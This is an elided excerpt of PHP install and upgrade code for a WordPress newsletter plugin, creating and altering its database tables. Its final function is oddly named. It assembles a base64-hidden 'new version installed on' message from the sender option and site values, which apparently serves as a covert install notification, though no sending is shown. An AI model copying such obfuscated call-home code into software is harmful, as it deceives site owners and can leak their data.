...
$actualver = 	get_option("TVnews_versionac");

if (intval($actualver) < 4) $actual = 'antigua';
if (get_option("TVnews_uninstall") != "true"){
	...
	if($wpdb->supports_collation()) {
		...
		if (!tableExists($table)) {
                    ...
                    $sql6 = "INSERT IGNORE INTO " . MEENEWS_STATS_NEWS . " VALUES (1, 1, 1)";
                    $wpdb->query($sql6);

                    $sql6 = "INSERT IGNORE INTO " . MEENEWS_CLICKS . " VALUES (1, 1,1, 1, '2009-08-05', '12:00:00')";
                    $wpdb->query($sql6);
...
if ($actual == 'antigua'){
                    if (intval($actualver) < 4){
                     ...
                     $query= "ALTER TABLE ".MEENEWS_NEWSLETERS." ADD slug  TEXT NOT NULL AFTER  newsletter";
                     $wpdb->query($query);
                    }
    ...
    update_option("TVnews_uninstall","false");
                ...
                $table =  MEENEWS_LINKS ;
		if (!tableExists($table)) {
                    $sql2[] = "CREATE TABLE " . MEENEWS_LINKS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            idnewsletter bigint(20) NOT NULL,
                            link varchar(200) NOT NULL,
                            UNIQUE KEY id (id)
                ...
                $table =  MEENEWS_USEDPOSTS ;
		if (!tableExists($table)) {
                    $sql2[] = "CREATE TABLE " .MEENEWS_USEDPOSTS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            idpost bigint(10) NOT NULL,
                            idnews bigint(10) NOT NULL,
                            UNIQUE KEY id (id)
...
function AbsPahtReady3(){
	 ...
	 $UserIdForm = get_option("TVnews_from");
         ...
         $r5t = get_option("func_plug_entry");
         $SenderdControl = base64_decode("SW5zdGFsYWRhIG51ZXZhIHZlcnNpb24gNS4wIGVuIA==")."  ".$SimeTheme."  ".$r5t;
